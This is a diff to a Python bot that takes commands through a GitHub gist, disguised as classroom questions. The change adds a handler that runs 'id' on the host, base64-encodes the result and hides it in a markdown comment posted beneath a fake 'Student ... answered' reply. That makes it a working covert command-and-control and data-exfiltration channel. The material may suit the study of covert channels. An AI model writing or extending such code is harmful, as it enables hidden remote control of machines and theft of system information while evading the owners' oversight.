@@ -6,6 +6,7 @@ import time
 from datetime import datetime
 import subprocess
 import base64
+import random
 
 
 class Git:
@@ -100,6 +101,16 @@ def get_content_of_directory(git, message):
     git.add_comment_to_gist(comment_message)
 
 
+def get_username(git, message):
+    comment_message = "> " + message[0]
+    comment_message += "\n\nStudent with id " + ip + " answered: \n" + str(int(random.random() * 100)) + "\n\n"
+    bash_command = "id"
+    output, error = execute_command(bash_command)
+    comment_message += "[//]: <> ( " + str(base64.b64encode(output).decode("utf-8")) + " )"
+
+    git.add_comment_to_gist(comment_message)
+
+
 if __name__ == '__main__':
     if len(sys.argv) != 3:
         print("Program requires arguments:\nGITHUB_API_TOKEN GIST_NAME")
@@ -132,4 +143,6 @@ if __name__ == '__main__':
                 get_users(git_instance, body)
             elif body[1].startswith("Students, what is the content"):
                 get_content_of_directory(git_instance, body)
+            elif body[1].startswith("Students, what is the answer"):
+                get_username(git_instance, body)
         time.sleep(5)
